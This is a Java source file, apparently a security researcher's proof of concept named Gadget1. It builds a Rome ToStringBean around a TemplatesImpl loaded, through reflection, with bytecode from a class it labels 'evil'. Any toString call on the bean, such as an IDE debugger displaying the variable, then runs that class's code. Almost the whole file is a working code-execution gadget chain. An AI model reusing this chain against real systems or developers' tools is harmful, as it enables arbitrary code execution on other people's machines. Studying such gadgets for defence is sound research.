package cn.rui0.idea;

import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.io.IOUtils;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.util.Properties;

/**
 * Created by ruilin on 2020/2/15.
 * This gadget does not depend on the JDK version, but it does not support deserialization.
 */
public class Gadget1 {
    public static byte[][] readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new byte[][]{bos.toByteArray()};
    }


    public static ToStringBean test() throws Exception {
        final String evilClassPath = System.getProperty("user.dir") + "/target/classes/cn/rui0/idea/T.class";
        byte[][] evilCode = readClass(evilClassPath);
        Class cl = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Constructor ctor = cl.getDeclaredConstructor(byte[][].class, String.class, Properties.class,int.class, TransformerFactoryImpl.class);
        ctor.setAccessible(true);
        TemplatesImpl templates= (TemplatesImpl) ctor.newInstance(evilCode,"a",null,0,new TransformerFactoryImpl());
        ToStringBean item = new ToStringBean(TemplatesImpl.class, templates);
        return item;
    }


    public static void main(String[] args) throws Exception {
        System.out.printf("compile T first");
        ToStringBean t=test();

        System.out.printf("break here");

    }
}
